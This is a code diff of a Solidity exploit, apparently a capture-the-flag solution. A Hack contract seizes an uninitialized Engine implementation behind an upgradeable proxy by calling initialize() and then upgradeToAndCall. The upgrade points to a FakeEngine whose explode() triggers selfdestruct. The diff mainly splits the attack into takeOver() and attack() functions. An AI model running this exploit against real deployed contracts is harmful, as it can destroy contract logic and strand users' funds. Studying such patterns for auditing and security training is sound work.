@@ -108,7 +108,7 @@ contract Engine is Initializable {
         }
     }
 
-    function getEngineAddress() public view returns(address) {
+    function getImplAddress() public view returns(address) {
       AddressSlot storage r;
         assembly {
             r.slot := _IMPLEMENTATION_SLOT
@@ -128,7 +128,6 @@ contract Engine is Initializable {
     }
 }
 
-
 interface EngineI {
   function initialize() external;
   function upgradeToAndCall(address newImplementation, bytes memory data) external payable ;
@@ -146,36 +145,25 @@ contract Hack {
     engine = EngineI(_engine);
     fakeEngine = _fakeEngine;
   }
-
-  function getTestCallData() public pure returns(bytes memory) {
-    return abi.encodeWithSignature("horsePower()");
-  }
-
-  function getTestCallData1() public pure returns(bytes memory) {
-    return abi.encodeWithSignature("horsePowerUnknown()");
-  }
   
+  function takeOver() public {
+    engine.initialize();
+  }
+
+  function attack() public {
+    engine.upgradeToAndCall(fakeEngine, abi.encodeWithSignature("explode()"));
+  }
 
   function hack() public {
-    engine.initialize();
-    engine.upgradeToAndCall(fakeEngine, abi.encodePacked(""));
-  }
-
-  function destroy() public {
-    (bool result, ) = address(engine).call(abi.encodeWithSignature("destroy()"));
-    require(result, "Engine was not destroyed");
-  }
-
-  function destroyFake() public {
-    (bool result, ) = fakeEngine.call(abi.encodeWithSignature("destroy()"));
-    require(result, "Engine was not destroyed");
+    takeOver();
+    attack();
   }
 }
 
 
 contract FakeEngine is Initializable  {
 
-  function destroy() public {
+  function explode() public {
     selfdestruct(payable(address(msg.sender)));
   }
 }
